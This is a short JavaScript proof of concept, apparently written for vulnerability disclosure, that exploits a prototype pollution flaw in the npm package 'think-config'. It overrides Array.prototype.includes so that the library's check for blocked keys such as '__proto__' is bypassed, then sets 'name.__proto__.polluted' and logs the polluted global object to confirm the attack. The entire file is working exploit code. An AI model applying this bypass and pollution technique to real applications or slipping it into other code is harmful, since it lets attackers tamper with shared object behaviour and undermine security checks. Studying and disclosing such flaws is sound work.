Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const Config = require('think-config');
const config = new Config({ name: 2 });
console.log({}.polluted);
let obj = {};
config.set('name.__proto__.polluted', 'yes');
console.log({}.polluted);